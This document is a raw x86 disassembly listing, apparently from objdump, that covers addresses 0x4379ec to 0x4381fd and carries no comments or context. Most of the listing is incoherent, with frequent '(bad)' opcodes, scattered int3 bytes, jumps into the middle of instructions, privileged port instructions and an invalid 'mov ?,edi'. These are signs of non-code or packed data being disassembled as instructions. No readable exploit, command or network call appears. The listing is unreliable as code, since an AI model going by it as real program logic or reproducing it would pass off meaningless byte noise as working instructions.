  4379ec:	call   DWORD PTR [edx]
  4379ee:	(bad)  
  4379ef:	jp     0x4379f0
  4379f1:	int3   
  4379f2:	sbb    ebp,DWORD PTR [edi+edi*8]
  4379f5:	shl    ch,0x69
  4379f8:	cmp    edi,0x64
  4379fb:	add    bh,bh
  4379fd:	push   ecx
  4379fe:	add    BYTE PTR [ebx-0x3767ff01],ch
  437a04:	jmp    FWORD PTR [ebx+0x5]
  437a07:	(bad)  
  437a08:	inc    DWORD PTR [ebx-0x747c001f]
  437a0e:	int3   
  437a0f:	sti    
  437a10:	add    bh,bh
  437a12:	adc    eax,0xa7228305
  437a17:	ja     0x437a19
  437a19:	xor    DWORD PTR [ecx],0xffffffff
  437a1c:	(bad)  
  437a1d:	in     eax,dx
  437a1e:	inc    DWORD PTR [ebp+0x2256ffff]
  437a24:	add    BYTE PTR [ecx],bl
  437a26:	dec    ebp
  437a27:	pop    ecx
  437a28:	inc    DWORD PTR [eax]
  437a2a:	mov    eax,0xcc490089
  437a2f:	(bad)  
  437a32:	ja     0x4379ba
  437a34:	push   edi
  437a36:	mov    eax,ds:0x45ffffaf
  437a3b:	add    bh,bh
  437a3d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  437a3e:	(bad)  
  437a3f:	(bad)  
  437a41:	jmp    DWORD PTR [edx+0x36]
  437a44:	add    BYTE PTR [edi+0x21],dl
  437a47:	push   ebp
  437a48:	inc    DWORD PTR [ebx+0x2383ff16]
  437a4e:	call   FWORD PTR [ebp-0x1]
  437a51:	add    BYTE PTR [esi],dl
  437a53:	mov    al,0xff
  437a55:	mov    bh,ah
  437a57:	cwde   
  437a58:	add    bh,bh
  437a5a:	cmp    DWORD PTR [ebx+0x51cc67ff],eax
  437a60:	add    bh,bh
  437a62:	jmp    0xd8657a53
  437a67:	pop    edx
  437a68:	add    BYTE PTR [eax],al
  437a6a:	sub    cl,ah
  437a6c:	add    bl,bh
  437a6e:	add    BYTE PTR [ecx+ecx*4+0x0],bh
  437a72:	cmp    al,0x45
  437a74:	add    BYTE PTR [edx],bl
  437a76:	adc    al,0x10
  437a78:	inc    DWORD PTR [eax]
  437a7a:	mov    bl,0xcc
  437a7c:	add    BYTE PTR [ecx-0x1],dl
  437a7f:	pop    ds
  437a80:	dec    DWORD PTR [ecx+0xbffdbc6]
  437a86:	xchg   ecx,eax
  437a87:	cli    
  437a88:	(bad)  
  437a89:	dec    edx
  437a8b:	add    DWORD PTR [eax],0xffffffc2
  437a8e:	dec    DWORD PTR [edi+edi*8+0x0]
  437a92:	push   0xffffffd0
  437a94:	jmp    DWORD PTR [esi-0x62]
  437a97:	in     al,dx
  437a98:	inc    DWORD PTR [ebx-0x2b00338c]
  437a9e:	add    ch,dh
  437aa0:	mov    edi,edi
  437aa2:	retf   0xffde
  437aa5:	push   ebp
  437aa6:	ins    DWORD PTR es:[edi],dx
  437aa7:	mov    ?,edi
  437aa9:	sub    DWORD PTR [eax],0x0
  437aac:	jmp    DWORD PTR [ecx-0x1]
  437aaf:	sub    bh,bh
  437ab1:	add    BYTE PTR [ecx],cl
  437ab3:	cdq    
  437ab4:	add    BYTE PTR [eax-0x5e],dh
  437ab7:	dec    esi
  437ab8:	mov    DWORD PTR [ebx+0x160083ce],eax
  437abe:	jmp    DWORD PTR [eax-0x41a40000]
  437ac4:	call   DWORD PTR [esi+0x2c]
  437ac7:	push   ss
  437ac8:	cmp    edi,0x11
  437acb:	add    bh,bh
  437acd:	push   ebp
  437ace:	jmp    DWORD PTR [edx+0x271900ff]
  437ad4:	jmp    FWORD PTR [ebp+0x3f]
  437ad7:	mov    al,0x83
  437ad9:	int3   
  437ada:	lahf   
  437adb:	add    BYTE PTR [eax],al
  437add:	jp     0x437a62
  437adf:	adc    edi,edi
  437ae1:	push   DWORD PTR [esp+edx*2]
  437ae4:	add    bh,ah
  437ae6:	(bad)  
  437ae7:	mov    ch,0xff
  437ae9:	mov    DWORD PTR [eax],edx
  437aeb:	dec    esp
  437aed:	pop    ecx
  437aee:	add    BYTE PTR [edi+0x4aa300ff],dh
  437af4:	int3   
  437af5:	and    DWORD PTR [edx],0xfd83002f
  437afb:	add    bh,bh
  437afd:	mov    esp,0xff009fff
  437b02:	ret    
  437b03:	xchg   esi,eax
  437b04:	mov    ecx,esi
  437b06:	sub    eax,0xed000081
  437b0b:	add    bh,bh
  437b0d:	hlt    
  437b0e:	jmp    DWORD PTR [esi-0x34]
  437b11:	(bad)  
  437b12:	fisttp QWORD PTR [eax]
  437b14:	add    BYTE PTR ds:0xff74d1,dl
  437b1a:	dec    ebx
  437b1b:	int3   
  437b1c:	add    BYTE PTR [edx],al
  437b1e:	add    BYTE PTR [edi+edi*8],cl
  437b21:	add    DWORD PTR [ebx+edx*2-0x1],0xffffffe5
  437b26:	out    0x54,al
  437b28:	cmp    edi,0xfffffffd
  437b2b:	dec    DWORD PTR [ecx-0xeb00a3]
  437b31:	call   FWORD PTR [eax+0x64d183da]
  437b37:	ins    BYTE PTR es:[edi],dx
  437b38:	mov    edi,edi
  437b3a:	dec    edi
  437b3b:	inc    DWORD PTR [eax]
  437b3d:	cld    
  437b3e:	jmp    DWORD PTR [eax]
  437b40:	add    bh,bh
  437b42:	adc    eax,DWORD PTR [eax-0x2372eb00]
  437b48:	inc    DWORD PTR [eax]
  437b4a:	pop    eax
  437b4b:	cmp    edi,0x11
  437b4e:	int3   
  437b4f:	out    dx,eax
  437b50:	add    bh,bh
  437b52:	ins    DWORD PTR es:[edi],dx
  437b53:	cli    
  437b54:	(bad)  
  437b55:	aas    
  437b56:	test   eax,ebx
  437b58:	inc    DWORD PTR [eax]
  437b5a:	in     al,0xff
  437b5c:	add    BYTE PTR [edx-0x1],bl
  437b5f:	mov    dh,0x83
  437b61:	(bad)  
  437b62:	fadd   QWORD PTR [edx]
  437b64:	add    BYTE PTR [ebx-0x33ffb656],bl
  437b6a:	jle    0x437b6b
  437b6c:	int3   
  437b6d:	jg     0x437b6e
  437b6f:	lods   eax,DWORD PTR ds:[esi]
  437b70:	(bad)  
  437b71:	jmp    edi
  437b73:	repnz (bad) 
  437b75:	mov    ebp,0x83f954
  437b7a:	and    edi,edi
  437b7c:	int3   
  437b7d:	call   0xf039:0x83cc55ff
  437b84:	or     DWORD PTR [esi-0x7c8fe6],0xffffffc6
  437b8b:	(bad)  
  437b8c:	push   esp
  437b8e:	push   esp
  437b90:	dec    esp
  437b92:	dec    ecx
  437b93:	rol    DWORD PTR [ebx-0x9af861],cl
  437b99:	int3   
  437b9a:	sar    edi,1
  437b9c:	int3   
  437b9d:	add    edi,edi
  437b9f:	adc    al,0xcc
  437ba1:	add    BYTE PTR [eax+0x5312ff4a],bl
  437ba7:	js     0x437b75
  437ba9:	(bad)  
  437baa:	jp     0x437bab
  437bac:	(bad)  
  437bad:	cmp    eax,DWORD PTR [ebx+0x4c000057]
  437bb3:	pop    esi
  437bb4:	call   DWORD PTR [ebp-0xffe743]
  437bba:	mov    ch,0xff
  437bbc:	add    ch,bl
  437bbe:	int3   
  437bbf:	fdiv   st(7),st
  437bc1:	push   DWORD PTR [ebx-0x435d0011]
  437bc7:	and    eax,0x77ff89
  437bcc:	int3   
  437bcd:	imul   eax,DWORD PTR [ebx-0x200000b3],0xc2b006a
  437bd7:	xor    bh,bh
  437bd9:	inc    esp
  437bdb:	cmp    edi,0x5f
  437bde:	(bad)  
  437bdf:	cmp    eax,0xd73600ff
  437be4:	call   edi
  437be6:	mov    al,ds:0x5bffff42
  437beb:	add    BYTE PTR [ebx+0x37ff9b],al
  437bf1:	add    BYTE PTR [edx+0x5f],ch
  437bf4:	int3   
  437bf5:	in     al,0x82
  437bf7:	xor    eax,DWORD PTR [ebx-0xffa401]
  437bfd:	xor    cl,BYTE PTR [ecx-0x333300d9]
  437c03:	push   ebx
  437c04:	call   DWORD PTR [edx+0xffc2ae]
  437c0a:	mov    al,ds:0x7083ff
  437c0f:	inc    eax
  437c10:	add    bh,bh
  437c12:	cmp    eax,0x14adff75
  437c17:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  437c18:	add    BYTE PTR [ebx-0x23007c2f],al
  437c1e:	jmp    DWORD PTR [ecx+0x0]
  437c21:	add    BYTE PTR [eax-0x3fd9ff5c],bh
  437c27:	popa   
  437c28:	inc    DWORD PTR [ebx+0x7400838a]
  437c2e:	jmp    FWORD PTR [eax-0x7d]
  437c31:	jmp    eax
  437c33:	out    dx,al
  437c34:	int3   
  437c35:	mov    al,ds:0x83ff0cb2
  437c3a:	test   edi,edi
  437c3c:	int3   
  437c3d:	and    DWORD PTR [ecx-0x2fff0077],ecx
  437c43:	fdivr  st,st(7)
  437c45:	cmp    bh,BYTE PTR [edx+eiz*4+0x0]
  437c49:	call   FWORD PTR [eax]
  437c4b:	add    DWORD PTR [eax],0x75
  437c4e:	add    BYTE PTR [eax-0x7ce90000],cl
  437c54:	call   DWORD PTR [esi-0x20]
  437c57:	fld    QWORD PTR [eax]
  437c59:	(bad)  
  437c5a:	fxch   st(4)
  437c5c:	inc    DWORD PTR [esi-0xff5334]
  437c62:	das    
  437c63:	cmp    al,0xff
  437c65:	in     al,0xc
  437c67:	xor    eax,0x830fffff
  437c6c:	dec    DWORD PTR [edx+0xff43ff]
  437c72:	add    DWORD PTR [edi+edi*8],0xff248eab
  437c79:	add    BYTE PTR [eax-0x34],bl
  437c7c:	jmp    FWORD PTR [edi-0x33004e01]
  437c82:	dec    edi
  437c83:	in     eax,dx
  437c84:	inc    DWORD PTR ds:0xffcc5bff
  437c8a:	pop    ecx
  437c8b:	mov    DWORD PTR [ebx-0xb5333d],eax
  437c91:	or     DWORD PTR [esi],0x43
  437c94:	xor    DWORD PTR [ebp-0xa0e4],0xffffff98
  437c9b:	(bad)  
  437c9c:	jmp    DWORD PTR [edx-0x33ff1500]
  437ca2:	es in  eax,0xff
  437ca5:	leave  
  437ca6:	daa    
  437ca7:	pushf  
  437ca8:	(bad)  
  437ca9:	jmp    DWORD PTR ds:0xffefff00
  437caf:	mov    eax,0x603fffff
  437cb4:	add    BYTE PTR [edx+0x4a],bl
  437cb7:	inc    ecx
  437cb8:	cmp    edi,0x25
  437cbb:	add    BYTE PTR [eax],al
  437cbd:	(bad)  
  437cbe:	jmp    ebp
  437cc0:	cmp    edi,0xffffff85
  437cc3:	push   esp
  437cc4:	inc    edi
  437cc6:	xor    ch,bh
  437cc8:	cmp    edi,0x0
  437ccb:	or     DWORD PTR [ecx-0x33967667],0xffffffff
  437cd2:	pop    ebp
  437cd3:	(bad)  
  437cd4:	int3   
  437cd5:	iret   
  437cd6:	cs (bad) 
  437cd8:	int3   
  437cd9:	int3   
  437cda:	or     bh,bh
  437cdc:	jmp    DWORD PTR [ebx-0x3333d800]
  437ce2:	mov    eax,0x47d20029
  437ce7:	xchg   esp,eax
  437ce8:	inc    DWORD PTR [eax]
  437cea:	sub    al,0xff
  437cec:	adc    DWORD PTR [ecx-0x7cff8c01],0xffffffb2
  437cf3:	jnp    0x437cf4
  437cf5:	gs push ecx
  437cf7:	sbb    bh,bh
  437cf9:	call   edx
  437cfb:	add    ah,cl
  437cfd:	pop    ebx
  437cfe:	call   FWORD PTR ds:0xd06f0000
  437d04:	add    ah,ah
  437d06:	mov    ds:0x5acc004c,eax
  437d0b:	add    DWORD PTR [eax],0x54
  437d0e:	add    cl,al
  437d10:	(bad)  
  437d11:	push   DWORD PTR [edx]
  437d13:	lahf   
  437d14:	mov    ebp,ebp
  437d16:	pop    ds
  437d17:	outs   dx,BYTE PTR ds:[esi]
  437d18:	(bad)  
  437d19:	jmp    FWORD PTR [esi+0x12cccc]
  437d1f:	sub    ecx,esp
  437d21:	jmp    esi
  437d23:	xchg   BYTE PTR [eax],al
  437d25:	enter  0x403b,0xff
  437d29:	add    BYTE PTR [eax],bl
  437d2b:	inc    DWORD PTR [eax]
  437d2d:	cmp    BYTE PTR [eax],al
  437d2f:	sahf   
  437d30:	inc    DWORD PTR [eax]
  437d32:	xchg   edi,eax
  437d33:	sar    edi,cl
  437d35:	pop    ss
  437d36:	xlat   BYTE PTR ds:[ebx]
  437d37:	out    0xff,al
  437d39:	(bad)  
  437d3a:	cmp    eax,0xff6389ff
  437d3f:	js     0x437cc4
  437d41:	int3   
  437d42:	test   ax,0x3083
  437d46:	sub    bl,BYTE PTR [eax+0x0]
  437d49:	adc    DWORD PTR [ecx-0x7caeff7d],0xffffffe2
  437d50:	int3   
  437d51:	dec    esp
  437d53:	test   al,0xff
  437d55:	call   ebx
  437d57:	ds int3 
  437d59:	add    BYTE PTR [ecx+0x0],dl
  437d5c:	push   DWORD PTR [edx-0x7c004701]
  437d62:	and    esp,edi
  437d64:	add    BYTE PTR [ebx],bh
  437d66:	dec    ebp
  437d67:	push   edi
  437d68:	or     esp,0xffffffc9
  437d6b:	(bad)  
  437d6c:	jmp    DWORD PTR [edi-0x1]
  437d6f:	or     al,0x0
  437d71:	jmp    FWORD PTR [ebx]
  437d73:	mov    cs,esp
  437d75:	jecxz  0x437d77
  437d77:	add    DWORD PTR ss:[ebx-0x47000092],0xffffffff
  437d7f:	jno    0x437d0a
  437d81:	push   esi
  437d83:	ret    0x6100
  437d86:	push   edx
  437d87:	cdq    
  437d88:	add    DWORD PTR [eax],0xffffff88
  437d8b:	add    bh,bh
  437d8d:	adc    bh,bh
  437d8f:	cdq    
  437d90:	(bad)  
  437d91:	jmp    DWORD PTR [edx]
  437d93:	jnp    0x437d94
  437d95:	jno    0x437d8e
  437d97:	or     eax,0xffdeffff
  437d9c:	inc    DWORD PTR [esi-0x1]
  437d9f:	pop    ecx
  437da0:	add    DWORD PTR [eax],0x6b
  437da3:	inc    BYTE PTR [eax]
  437da5:	test   eax,0xcc3961
  437daa:	jg     0x437dac
  437dac:	add    BYTE PTR [edi+edi*8+0x5affff2d],bh
  437db3:	push   cs
  437db4:	add    bl,al
  437db6:	ja     0x437daa
  437db8:	(bad)  
  437db9:	dec    DWORD PTR ds:0x240083
  437dbf:	in     eax,0xff
  437dc1:	(bad)  
  437dc2:	std    
  437dc3:	xor    BYTE PTR [ecx-0x7cc905af],cl
  437dc9:	add    BYTE PTR [esi-0x7d],ch
  437dcc:	inc    DWORD PTR [esi]
  437dce:	int3   
  437dcf:	int    0xff
  437dd1:	call   DWORD PTR [ebx-0x7cafff05]
  437dd7:	add    BYTE PTR cs:[eax],al
  437dda:	cli    
  437ddb:	add    BYTE PTR [ebx+0x19fff7],al
  437de1:	add    BYTE PTR [ebx-0x72e800de],cl
  437de7:	sbb    cl,ah
  437de9:	call   DWORD PTR [ecx]
  437deb:	add    bh,bh
  437ded:	xor    bh,bh
  437def:	jns    0x437df0
  437df1:	add    BYTE PTR [edx+esi*4+0x11be4ff],ch
  437df8:	mov    DWORD PTR [eax],eax
  437dfa:	inc    WORD PTR [ebx-0x470015]
  437e01:	add    BYTE PTR [ecx+0x72],bl
  437e04:	call   FWORD PTR [ebx]
  437e06:	push   edi
  437e07:	sbb    eax,0x8b00ff
  437e0c:	call   ebp
  437e0e:	mov    DWORD PTR [edi],esi
  437e10:	add    BYTE PTR [ebx-0x5e3360e4],al
  437e16:	lods   eax,DWORD PTR ds:[esi]
  437e17:	jnp    0x437d9c
  437e19:	sbb    DWORD PTR [eax-0x1],0xffffffff
  437e1d:	push   esi
  437e1e:	(bad)  
  437e1f:	jg     0x437e21
  437e21:	add    BYTE PTR [ecx+0x43a18364],cl
  437e27:	jmp    0xfffd01b5
  437e2c:	jmp    esp
  437e2e:	or     DWORD PTR [ebx],0xffffffcc
  437e31:	int3   
  437e32:	jne    0x437e9f
  437e34:	xor    DWORD PTR [ecx-0x7cff8001],0xffffffe5
  437e3b:	inc    DWORD PTR [ebx+0x2ffde]
  437e41:	int3   
  437e42:	push   ecx
  437e43:	sar    edi,cl
  437e45:	test   ebx,ebp
  437e47:	or     BYTE PTR [ecx+0x9783],0x6
  437e4e:	dec    DWORD PTR [eax+eax*1-0x1]
  437e52:	mov    ds:0x47adff20,eax
  437e57:	cli    
  437e58:	cmp    edi,0xffffffd2
  437e5b:	inc    DWORD PTR [ebx+0x4affb5]
  437e61:	sub    DWORD PTR [eax],0x7d
  437e64:	int3   
  437e65:	imul   esi,DWORD PTR [edx+0x1],0xff6483ff
  437e6c:	add    BYTE PTR [ebp-0x767201],al
  437e72:	inc    eax
  437e73:	dec    esp
  437e74:	add    ch,bh
  437e76:	mov    eax,ds:0xc7ff83e4
  437e7b:	mov    esp,ecx
  437e7d:	ret    0xe9ff
  437e80:	add    BYTE PTR [ebx+0x64008e0c],al
  437e86:	xchg   DWORD PTR [ebp-0xe77c01],ebx
  437e8c:	dec    DWORD PTR [eax]
  437e8e:	add    BYTE PTR [edx-0x1],ch
  437e91:	call   DWORD PTR [esi+0x6a]
  437e94:	add    BYTE PTR [edx],ah
  437e96:	mov    esp,0x7d00ff37
  437e9b:	inc    DWORD PTR [eax]
  437e9d:	jbe    0x437e28
  437e9f:	dec    eax
  437ea0:	inc    DWORD PTR [eax]
  437ea2:	addr16 out 0xff,eax
  437ea5:	loop   0x437e61
  437ea7:	sbb    BYTE PTR [eax],al
  437ea9:	add    edi,0xffffff83
  437eac:	(bad)  
  437ead:	cmp    eax,0x89008600
  437eb2:	call   0x6:0x520fffd6
  437eb9:	or     ebp,0xffffffff
  437ebc:	xor    esi,0xffffff83
  437ebf:	pop    es
  437ec0:	cmp    edi,0xffffffbc
  437ec3:	les    eax,FWORD PTR [eax]
  437ec5:	jle    0x437e87
  437ec7:	inc    ecx
  437ec8:	(bad)  
  437ec9:	(bad)  
  437eca:	cli    
  437ecb:	mov    DWORD PTR [eax],eax
  437ecd:	in     eax,dx
  437ece:	mov    DWORD PTR [ebx],edx
  437ed0:	add    BYTE PTR [eax],al
  437ed2:	add    ecx,DWORD PTR [edi+0x0]
  437ed5:	sub    BYTE PTR [edi-0xd7c00d5],ah
  437edb:	cmp    edi,0xfffffff9
  437ede:	jmp    FWORD PTR [ebx-0x1]
  437ee1:	and    eax,0xffffffcc
  437ee4:	dec    esi
  437ee6:	dec    edx
  437ee7:	xor    al,BYTE PTR [eax]
  437ee9:	dec    edx
  437eeb:	add    DWORD PTR [eax],0x76
  437eee:	xor    esp,0xffffffff
  437ef1:	jmp    DWORD PTR [ecx-0x5a]
  437ef4:	add    BYTE PTR [edi+0x43],bh
  437ef7:	add    BYTE PTR gs:[ebx-0x6aff33d7],al
  437efe:	int3   
  437eff:	enter  0xff,0xa5
  437f03:	loopne 0x437f04
  437f05:	push   0x52
  437f07:	popf   
  437f08:	add    DWORD PTR [ebx+0x65ffcc49],0xffffff83
  437f0f:	mov    esp,0x71178983
  437f14:	add    BYTE PTR [edi+eiz*8+0x4f],ch
  437f18:	add    ah,cl
  437f1a:	call   0x387feb
  437f1f:	je     0x437f20
  437f21:	mov    DWORD PTR [esi-0x26],ecx
  437f24:	mov    edx,esp
  437f26:	adc    ecx,ebx
  437f28:	(bad)  
  437f29:	push   esi
  437f2b:	inc    DWORD PTR [eax]
  437f2d:	(bad)  
  437f2e:	add    BYTE PTR [ecx+0x511effff],al
  437f34:	add    BYTE PTR [ebp+eiz*8-0x47],dl
  437f38:	add    BYTE PTR [ecx-0x6c7cff6f],cl
  437f3e:	call   DWORD PTR [edx-0x4c440000]
  437f44:	(bad)  
  437f45:	out    dx,al
  437f46:	sti    
  437f47:	es (bad) 
  437f49:	dec    DWORD PTR [ebx+0xdbff00]
  437f4f:	inc    ebx
  437f50:	dec    esp
  437f52:	test   al,0xe4
  437f54:	add    BYTE PTR [esi+0x49],bl
  437f57:	inc    edx
  437f58:	(bad)  
  437f59:	dec    eax
  437f5b:	(bad)  
  437f5c:	call   DWORD PTR [eax-0x7cff1201]
  437f62:	fcomi  st,st(0)
  437f64:	adc    ecx,0xffffff83
  437f67:	clc    
  437f68:	inc    DWORD PTR [ebx+0x798383de]
  437f6e:	jmp    FWORD PTR [ecx+0x4684ffff]
  437f74:	inc    DWORD PTR [edi]
  437f76:	shr    DWORD PTR [edx],1
  437f78:	add    BYTE PTR [eax],al
  437f7a:	repz add BYTE PTR [ecx-0x7685ff5c],cl
  437f81:	add    dl,cl
  437f83:	xor    edi,edi
  437f85:	fwait
  437f86:	pop    esp
  437f87:	lock add BYTE PTR [eax],al
  437f8a:	and    al,0xff
  437f8c:	add    cl,al
  437f8e:	add    bh,bh
  437f90:	int3   
  437f91:	(bad)  
  437f92:	jle    0x437fe0
  437f94:	add    BYTE PTR [ebp+edi*2+0x5effff7a],bh
  437f9b:	inc    DWORD PTR [eax]
  437f9d:	(bad)
  437fa1:	int3   
  437fa2:	(bad)  
  437fa3:	jmp    0x437fa4
  437fa5:	push   ebx
  437fa6:	jg     0x437fb0
  437fa8:	int3   
  437fa9:	cmp    DWORD PTR [ebx+0x0],0xffffffff
  437fad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  437fae:	call   DWORD PTR [edx-0x1c70001]
  437fb4:	call   FWORD PTR [edi-0x22]
  437fb7:	test   edi,edi
  437fb9:	(bad)  
  437fba:	mov    ebx,0xff2000ff
  437fbf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  437fc0:	cmp    edi,0xffffffd7
  437fc3:	jnp    0x437fc4
  437fc5:	push   0xffffff81
  437fc7:	jbe    0x437fc8
  437fc9:	int3   
  437fca:	nop
  437fcb:	add    BYTE PTR [eax],al
  437fcd:	ins    DWORD PTR es:[edi],dx
  437fce:	jmp    esp
  437fd0:	(bad)  
  437fd1:	jmp    DWORD PTR [edi]
  437fd3:	cmp    bh,bh
  437fd5:	mov    ebx,0xff81c7
  437fda:	test   DWORD PTR [eax],0xfff9a83
  437fe0:	add    BYTE PTR [eax],al
  437fe2:	cdq    
  437fe3:	mov    ds:0x695a3a00,al
  437fe8:	add    BYTE PTR [ebx+0x3883ff83],al
  437fee:	jmp    FWORD PTR [edx-0x1]
  437ff1:	call   DWORD PTR [ebp+0x2f47ff5a]
  437ff7:	or     al,BYTE PTR [ebx-0x7cff4777]
  437ffd:	into   
  437ffe:	(bad)  
  437fff:	inc    DWORD PTR ds:[eax]
  438002:	jmp    0xff1e:0x37883fd
  438009:	add    ah,dl
  43800b:	dec    esp
  43800d:	xchg   edi,eax
  43800e:	add    BYTE PTR [ecx-0x1],cl
  438011:	mov    DWORD PTR [ecx],esi
  438013:	repz inc DWORD PTR [esi]
  438016:	mov    ch,0x68
  438018:	add    bh,bh
  43801a:	xor    eax,0xffc7ffff
  43801f:	inc    ecx
  438020:	inc    DWORD PTR [eax]
  438022:	pop    ds
  438023:	fadd   DWORD PTR [eax]
  438025:	add    eax,0xff00f4ad
  43802a:	cmp    eax,0xff7283ff
  43802f:	or     al,0xff
  438031:	push   DWORD PTR [ebx]
  438033:	jge    0x438034
  438035:	sar    edx,cl
  438037:	add    bh,bh
  438039:	add    BYTE PTR [ecx+ecx*4-0x6076a734],ch
  438040:	inc    DWORD PTR [eax]
  438042:	(bad)  
  438043:	in     al,0xcc
  438045:	scas   eax,DWORD PTR es:[edi]
  438046:	or     dh,bl
  438048:	add    DWORD PTR [eax],0xffffff84
  43804b:	(bad)  
  43804c:	inc    ebx
  43804e:	and    eax,0x0
  438051:	dec    DWORD PTR [eax+0x6085ff1d]
  438057:	repz (bad) 
  438059:	(bad)  
  43805a:	mov    esi,0x83858300
  43805f:	adc    al,0x89
  438061:	(bad)  
  438062:	jp     0x43807f
  438064:	int3   
  438065:	cmp    eax,0xffff1512
  43806a:	push   eax
  43806b:	add    ah,cl
  43806d:	jns    0x43806f
  43806f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  438070:	add    bh,bh
  438072:	lods   al,BYTE PTR ds:[esi]
  438073:	loope  0x438075
  438075:	fcom   DWORD PTR [ebx-0x41]
  438078:	add    bh,bh
  43807a:	push   eax
  43807b:	add    bh,bh
  43807d:	jle    0x43807e
  43807f:	xchg   edi,edi
  438081:	jmp    DWORD PTR [edx+0x55]
  438084:	int3   
  438085:	call   0x42a7eb
  43808a:	mov    eax,ds:0x1dffff
  43808f:	push   eax
  438090:	add    bh,bh
  438092:	sub    bh,BYTE PTR [edi+edi*8]
  438095:	and    BYTE PTR [eax],0x73
  438098:	dec    esp
  43809a:	add    al,0x0
  43809c:	inc    DWORD PTR [ebx]
  43809e:	(bad)  
  43809f:	std    
  4380a0:	add    bh,bh
  4380a2:	retf   
  4380a3:	add    edi,edi
  4380a5:	out    0xfa,al
  4380a7:	mov    ch,0x83
  4380a9:	add    bh,bl
  4380ab:	mov    edi,edi
  4380ad:	jge    0x43807b
  4380af:	std    
  4380b0:	inc    DWORD PTR [eax]
  4380b2:	or     al,0xdc
  4380b4:	add    bh,ah
  4380b6:	(bad)  
  4380b8:	cmp    edi,0xffffff9e
  4380bb:	add    bh,bh
  4380bd:	push   es
  4380be:	push   eax
  4380c0:	dec    esp
  4380c2:	sbb    eax,0x1b36ff8d
  4380c7:	xor    bh,bh
  4380c9:	add    BYTE PTR [esi],cl
  4380cb:	mov    esp,ecx
  4380cd:	(bad)  
  4380ce:	jmp    DWORD PTR [ecx-0x77]
  4380d1:	dec    DWORD PTR [edx]
  4380d3:	fld    DWORD PTR [eax]
  4380d5:	je     0x43805b
  4380d7:	aad    0x89
  4380d9:	push   ebx
  4380db:	int3   
  4380dc:	dec    DWORD PTR [ecx-0x7d]
  4380df:	mov    ebx,0xc750083
  4380e4:	add    BYTE PTR [edi-0x70],dh
  4380e7:	popa   
  4380e8:	cmp    edi,0xffffffd9
  4380eb:	mov    DWORD PTR [eax],eax
  4380ed:	push   edi
  4380ee:	sbb    DWORD PTR [ebp-0x1],0xffffffff
  4380f2:	neg    DWORD PTR [edi-0x1]
  4380f5:	rcl    DWORD PTR [eax+0x79],0xff
  4380f9:	add    BYTE PTR [edx],al
  4380fb:	inc    DWORD PTR [eax]
  4380fd:	or     eax,0x8383df00
  438102:	mov    ah,0xe2
  438104:	jmp    DWORD PTR [ecx-0xd441]
  43810a:	fdiv   st(7),st
  43810c:	add    BYTE PTR [edx-0x8401],bh
  438112:	lods   al,BYTE PTR ds:[esi]
  438113:	idiv   edi
  438115:	aaa    
  438116:	xor    dh,BYTE PTR [eax-0x9a007d]
  43811c:	jmp    FWORD PTR ds:0x83ff8ecc
  438122:	cmp    eax,0x8d54ff37
  438127:	hlt    
  438128:	add    BYTE PTR [eax],al
  43812a:	mov    ch,0xff
  43812c:	add    BYTE PTR [edi+0x0],dl
  43812f:	dec    edx
  438130:	(bad)  
  438131:	jmp    DWORD PTR [eax+0x13940016]
  438137:	mov    ch,0xff
  438139:	or     DWORD PTR [eax-0x1],0xffffffff
  43813d:	dec    eax
  43813e:	mov    DWORD PTR [eax+0x5b3883ff],edx
  438144:	(bad)  
  438145:	fdiv   st,st(5)
  438147:	cmp    bh,0xff
  43814a:	hlt    
  43814b:	add    BYTE PTR [eax],al
  43814d:	mov    DWORD PTR [eax],eax
  43814f:	sbb    al,0xff
  438151:	jmp    FWORD PTR [esi-0x2a]
  438154:	add    bl,ah
  438156:	out    0xe0,eax
  438158:	or     DWORD PTR [ecx+0x6700ff54],0x0
  43815f:	or     bh,bh
  438161:	jmp    DWORD PTR [ebp-0x7f]
  438164:	jmp    FWORD PTR [edi]
  438166:	mov    edx,0x2189ffd3
  43816b:	(bad)  
  43816c:	push   DWORD PTR [edi]
  43816e:	int3   
  43816f:	pop    edx
  438170:	(bad)  
  438171:	inc    DWORD PTR [esi]
  438173:	cmc    
  438174:	push   DWORD PTR [ebp+0x20]
  438177:	(bad)  
  438178:	(bad)  
  438179:	inc    DWORD PTR [ecx]
  43817b:	(bad)  
  43817c:	(bad)  
  43817d:	fld    QWORD PTR [ebx+0x289cc91]
  438183:	and    eax,0x307190ff
  438188:	inc    DWORD PTR [eax]
  43818a:	pop    edx
  43818b:	int3   
  43818c:	and    ebp,0xffffffff
  43818f:	into   
  438190:	inc    DWORD PTR [ebx-0xf002184]
  438196:	sbb    DWORD PTR [ebx+eax*4-0x7c007a00],esp
  43819d:	loope  0x438128
  43819f:	push   ebp
  4381a0:	add    bh,bh
  4381a2:	sbb    BYTE PTR [edx+0x0],ah
  4381a5:	dec    esp
  4381a6:	cmc    
  4381a7:	leave  
  4381a8:	inc    DWORD PTR [eax]
  4381aa:	(bad)  
  4381ac:	sbb    DWORD PTR [edi-0x7c5b77],0xffffffc2
  4381b3:	or     eax,0x33628189
  4381b8:	inc    DWORD PTR [eax]
  4381ba:	fcmovne st,st(4)
  4381bc:	add    BYTE PTR [ecx],ah
  4381be:	int3   
  4381bf:	scas   al,BYTE PTR es:[edi]
  4381c0:	add    BYTE PTR [eax],al
  4381c2:	push   0x34e1ffcc
  4381c7:	nop
  4381c8:	cmp    edi,0xffffffac
  4381cb:	inc    DWORD PTR [eax]
  4381cd:	mov    esp,0x89ffa100
  4381d2:	or     dh,ah
  4381d4:	call   ebp
  4381d6:	push   ss
  4381d7:	sub    eax,DWORD PTR [ebx+0xcca6ff]
  4381dd:	lods   eax,DWORD PTR ds:[esi]
  4381de:	add    bl,ch
  4381e0:	inc    DWORD PTR [eax]
  4381e2:	xchg   ecx,eax
  4381e3:	scas   al,BYTE PTR es:[edi]
  4381e4:	call   eax
  4381e6:	js     0x43820d
  4381e8:	or     esp,0x7
  4381eb:	(bad)  
  4381ec:	push   DWORD PTR [esi]
  4381ee:	add    BYTE PTR [edi-0x34],dh
  4381f1:	int3   
  4381f2:	inc    ebx
  4381f3:	scas   eax,DWORD PTR es:[edi]
  4381f4:	mov    DWORD PTR [edx-0x9],edi
  4381f7:	lahf   
  4381f8:	mov    edi,edi
  4381fa:	dec    edi
  4381fb:	inc    DWORD PTR [eax]
  4381fd:	fwait
